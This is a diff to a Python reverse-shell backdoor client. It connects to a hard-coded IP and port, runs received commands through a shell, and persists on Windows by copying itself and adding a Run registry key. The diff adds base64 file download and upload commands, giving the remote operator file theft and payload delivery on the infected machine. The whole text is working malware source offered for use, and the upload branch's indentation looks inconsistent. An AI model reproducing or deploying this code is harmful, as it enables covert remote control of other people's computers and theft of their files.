@@ -6,14 +6,17 @@ import time
 import os
 import shutil # screenshot
 import sys # use in copy function 
+import base64
 
 
 
 # trying to retyr the connection
 def connection():
+	global sock
 	while True:
 		time.sleep(5)
 		try:
+			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
 			sock.connect(("192.168.88.19", 54321))
 			shell()
 		except:
@@ -40,6 +43,7 @@ def reliable_rcv():
                         continue
 
 
+
 def shell():
 	while True:
 		command = reliable_rcv() # receive bytes
@@ -50,6 +54,14 @@ def shell():
 				os.chdir(command[3:])
 			except:
 				continue
+		elif command[:8] == "download":
+			# file = open(command[9:], "wb")  # you can this also
+			with open(command[9:], "rb") as file:
+				reliable_send(base64.b64encode(file.read()))
+		elif command[:6] == "upload":
+	                with open(command[7:], "wb") as fin:
+                                result = reliable_rcv()
+				fin.write(base64.b64decode(result))
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
@@ -64,6 +76,6 @@ if not os.path.exists(location):
 	shutil.copyfile(sys.executable, location)
 	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v win /t REG_SZ /d "' + location + '"', shell=True)
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # IPv4 and TCP
+
 connection()
 sock.close()
